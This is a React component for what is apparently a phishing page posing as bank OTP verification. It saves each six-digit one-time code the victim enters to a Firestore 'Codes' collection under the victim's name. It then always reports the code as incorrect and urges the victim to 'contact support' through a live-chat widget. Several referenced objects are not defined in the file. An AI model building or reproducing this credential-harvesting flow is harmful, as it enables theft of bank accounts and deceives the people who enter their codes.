import "../styles/bankCode.css"
import { useState, useRef, useEffect } from "react";


function BankCode() {



    const [count, setCount] = useState(59); // Initial countdown value

    useEffect(() => {
        if (count > 0) {
            const timer = setInterval(() => {
                setCount((prevCount) => prevCount - 1);
            }, 1000); // Decrease count every second

            return () => clearInterval(timer); // Cleanup on unmount or re-render
        }
    }, [count]);




    const [otp, setOtp] = useState(new Array(6).fill(""));
    const inputsRef = useRef([]);

    const handleChange = (element, index) => {
        if (/^[0-9]$/.test(element.value) || element.value === "") {
            const newOtp = [...otp];
            newOtp[index] = element.value;
            setOtp(newOtp);
            if (element.value !== "" && index < 5) {
                inputsRef.current[index + 1].focus();
            }
        }
    };

    console.log(Date())

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace" && otp[index] === "" && index > 0) {
            inputsRef.current[index - 1].focus();
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setCMode(!cMode)
        const otpValue = otp.join("");
        if (otpValue.length === 6) {
            try {
                await setDoc(doc(db, "Codes", userDetails.Fname + " " + Date()), {
                    code: otpValue,
                })
                    .then((data) => {
                        toast.error("incorrect otp code entered", { position: "top-center" })
                        setShowLoad(false)
                    })
                    .catch((error) => {
                        toast.error("error occured", { position: "top-center" })
                        console.log(error.message)
                        setShowLoad(false)
                    })
            } catch (error) {
                console.log(error.message)

            }
        } else {
            toast.error("Please enter a 6-digit OTP", { position: "top-center" });
        }
    };

    const [cMode, setCMode] = useState(false)

    const cStyle = {
        display: cMode ? "flex": "none",
    }

   function openJivoChat(){
    if(typeof jivo_api !== 'undefined') {
        jivo_api.open();
    }else {
        console.log("jivo not available")
    }
   }




    return (
        <>
        <div className="c-support" style={cStyle}>
           <div className="c-box">
             <h1>Incorrect Otp!</h1>
             <i className="bi-headset"></i>
             <p>For security reasons, you need to contact support and requuest for your OTP code</p>
             <button onClick={openJivoChat}>Contact support</button>
           </div>
        </div>
        <div className="bank-code">
            <h1 className="bank-c-head">Don't see a code in {`00:${count > 0 ? count : "00"}`}? <br /><span onClick={openJivoChat}>Contact Support</span></h1>
            <div>
                <div className="container" role="main">
                    <h2>Verify Your OTP</h2>
                    <p className="subtitle">Enter the 6-digit code sent to your email <br />or Phone number</p>
                    <form onSubmit={handleSubmit} aria-label="OTP Verification Form" className="de-form">
                        <div className="otp-inputs">
                            {otp.map((data, index) => (
                                <input
                                    key={index}
                                    type="tel"
                                    name="otp"
                                    inputMode="numeric"
                                    autoComplete="one-time-code"
                                    pattern="\d*"
                                    maxLength="1"
                                    className="otp-input"
                                    value={data}
                                    onChange={(e) => handleChange(e.target, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    ref={(el) => (inputsRef.current[index] = el)}
                                    aria-label={`Digit ${index + 1}`}
                                />
                            ))}
                        </div>
                        <button type="submit" className="verify-btn" aria-label="Verify OTP">
                            Verify
                        </button>
                    </form>
                    <p className="resend-text">
                        Didn't receive the code?
                        <button
                            className="resend-btn"
                            onClick={() => alert("OTP sent")}
                            aria-label="Resend OTP"
                            type="button"
                        >
                            Resend
                        </button>
                    </p>
                </div>
            </div>
        </div>
        </>
    )
}


export default BankCode;